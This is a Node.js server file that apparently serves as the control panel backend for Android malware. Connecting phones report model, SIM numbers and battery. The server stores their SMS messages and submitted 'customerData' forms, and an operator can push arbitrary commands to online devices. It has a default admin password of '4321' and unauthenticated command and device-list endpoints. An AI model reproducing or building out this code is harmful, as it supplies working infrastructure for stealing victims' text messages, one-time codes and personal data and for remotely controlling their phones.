require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const WebSocket = require('ws');

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => { req.setTimeout(30000); res.setTimeout(30000); next(); });

const MONGO_URI = process.env.MONGO_URI || '';
if (!MONGO_URI) { console.error('MONGO_URI missing'); process.exit(1); }

mongoose.set('bufferCommands', false);
let dbConnected = false;

mongoose.connect(MONGO_URI, {
  serverSelectionTimeoutMS: 5000,
  connectTimeoutMS: 10000,
  socketTimeoutMS: 45000,
  maxPoolSize: 10,
  writeConcern: { w: 1 }
}).then(() => {
  dbConnected = true;
  console.log('--- MongoDB Connected Successfully ---');
}).catch(err => {
  dbConnected = false;
  console.error('--- MongoDB Connection Failed ---', err.message);
});

const deviceSchema = new mongoose.Schema({
  deviceId: { type: String, index: true },
  serialNumber: String,
  model: String,
  androidVersion: String,
  sim1: String,
  sim2: String,
  battery: Number,
  isOnline: Boolean,
  lastSeen: Date,
  isPinned: Boolean,
  registrationTimestamp: { type: Date, default: Date.now },
  customerData: mongoose.Schema.Types.Mixed,
  isDeleted: { type: Boolean, default: false },
  smsMessages: { type: Array, default: [] }
}, { timestamps: true });

const Device = mongoose.model('Device', deviceSchema);

// In-Memory Fallback for testing
const inMemoryDevices = [];
function clone(obj) { return obj ? JSON.parse(JSON.stringify(obj)) : obj; }

async function findDevice(id) {
  if (dbConnected) return await Device.findOne({ $or: [{ deviceId: id }, { serialNumber: id }] }).lean();
  return clone(inMemoryDevices.find(d => d.deviceId === id || d.serialNumber === id));
}

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const wss = new WebSocket.Server({ noServer: true });
global.deviceSockets = new Map();

let adminPassword = process.env.ADMIN_PASSWORD || '4321';

// --- API Routes ---

app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  if (username === 'admin' && password === adminPassword) return res.json({ success: true });
  return res.status(401).json({ success: false, message: 'Unauthorized' });
});

app.get('/api/devices', async (req, res) => {
  try {
    let list;
    if (dbConnected) {
      list = await Device.find({ isDeleted: { $ne: true } }).lean();
    } else {
      list = inMemoryDevices.filter(d => !d.isDeleted).map(clone);
    }
    const now = Date.now();
    list.forEach(d => { 
      if (d.lastSeen && (now - new Date(d.lastSeen).getTime()) > 60000) d.isOnline = false; 
    });
    res.json(list);
  } catch (err) { res.status(500).json({ error: 'Failed to fetch devices' }); }
});

app.post('/api/command', async (req, res) => {
  try {
    const { deviceId, action, data } = req.body || {};
    if (!deviceId || !action) return res.status(400).json({ success: false, message: 'Missing deviceId or action' });

    const device = await findDevice(deviceId);
    const clients = global.deviceSockets.get(deviceId);
    const isOnline = clients && clients.size > 0;

    // --- Offline Support for View Actions ---
    if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
      if (!device) return res.status(404).json({ success: false, message: 'Device not found' });

      // If online, ask device to update data in background
      if (isOnline) {
        clients.forEach((client) => {
          if (client.readyState === WebSocket.OPEN) 
            client.send(JSON.stringify({ command: action, data: {} }));
        });
      }

      const responseData = { success: true, isOnline: isOnline };
      
      if (action === 'VIEW_SMS') {
        let messages = device.smsMessages || [];
        // Sort: Latest SMS first, then take top 50
        messages.sort((a, b) => (new Date(b.date || b.time || 0)) - (new Date(a.date || a.time || 0)));
        responseData.messages = messages.slice(0, 50);
      } else if (action === 'VIEW_FORM') {
        responseData.customerData = device.customerData || {};
      } else {
        responseData.device = device;
      }

      return res.json(responseData);
    }

    // --- Other commands (require device to be online) ---
    if (!isOnline) return res.json({ success: false, message: 'Device not connected' });

    clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) 
        client.send(JSON.stringify({ command: action, data }));
    });

    return res.json({ success: true, message: 'Command sent' });
  } catch (err) { 
    return res.status(500).json({ success: false, message: err.message }); 
  }
});

// Pin/Delete/ChangePass... (Keeping them as they were)
app.post('/api/delete-device', async (req, res) => {
  try {
    const { deviceId, password } = req.body || {};
    if (password !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong password' });
    if (dbConnected) {
      await Device.deleteOne({ deviceId });
    } else {
      const idx = inMemoryDevices.findIndex(d => d.deviceId === deviceId);
      if (idx > -1) inMemoryDevices.splice(idx, 1);
    }
    io.emit('dashboard-update');
    return res.json({ success: true });
  } catch (err) { return res.status(500).json({ success: false }); }
});

app.post('/api/pin-device', async (req, res) => {
  try {
    const { deviceId, status } = req.body || {};
    if (dbConnected) {
      await Device.findOneAndUpdate({ deviceId }, { $set: { isPinned: !!status } });
    } else {
      const d = inMemoryDevices.find(d => d.deviceId === deviceId);
      if (d) d.isPinned = !!status;
    }
    io.emit('dashboard-update');
    return res.json({ success: true });
  } catch (e) { return res.status(500).json({ success: false }); }
});

// WebSocket Handling
server.on('upgrade', (req, socket, head) => {
  if (req.url.startsWith('/socket.io')) return;
  wss.handleUpgrade(req, socket, head, (ws) => wss.emit('connection', ws, req));
});

wss.on('connection', (ws, req) => {
  ws.isAlive = true;
  ws.on('pong', () => ws.isAlive = true);

  ws.on('message', async (msg) => {
    try {
      const data = JSON.parse(msg);
      const id = data.deviceId || data.serialNumber;
      if (!id) return;

      ws.deviceId = id;
      if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
      global.deviceSockets.get(id).add(ws);

      const update = {
        isOnline: true,
        lastSeen: new Date(),
        deviceId: id,
        serialNumber: data.serialNumber || id,
        model: data.model,
        androidVersion: data.androidVersion,
        sim1: data.sim1,
        sim2: data.sim2,
        battery: data.battery
      };

      if (dbConnected) {
        await Device.findOneAndUpdate({ deviceId: id }, { $set: update, $setOnInsert: { registrationTimestamp: new Date() } }, { upsert: true });
      } else {
        let d = inMemoryDevices.find(x => x.deviceId === id);
        if (!d) { d = { ...update, registrationTimestamp: new Date() }; inMemoryDevices.push(d); }
        else Object.assign(d, update);
      }
      io.emit('dashboard-update');

      if (data.type === 'SMS_LIST' && Array.isArray(data.messages)) {
        if (dbConnected) await Device.findOneAndUpdate({ deviceId: id }, { $set: { smsMessages: data.messages } });
        else { let d = inMemoryDevices.find(x => x.deviceId === id); if (d) d.smsMessages = data.messages; }
        io.emit('sms-list-update', { deviceId: id, messages: data.messages });
      }

      if (data.type === 'FORM_SUBMIT' && data.customerData) {
        if (dbConnected) await Device.findOneAndUpdate({ deviceId: id }, { $set: { customerData: data.customerData } });
        else { let d = inMemoryDevices.find(x => x.deviceId === id); if (d) d.customerData = data.customerData; }
        io.emit('dashboard-update');
      }
    } catch (e) { console.error('WS Message Error:', e.message); }
  });

  ws.on('close', () => {
    if (ws.deviceId && global.deviceSockets.has(ws.deviceId)) {
      global.deviceSockets.get(ws.deviceId).delete(ws);
      if (global.deviceSockets.get(ws.deviceId).size === 0) global.deviceSockets.delete(ws.deviceId);
    }
  });
});

setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) return ws.terminate();
    ws.isAlive = false;
    try { ws.ping(); } catch (e) {}
  });
}, 20000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log('Server listening on port', PORT));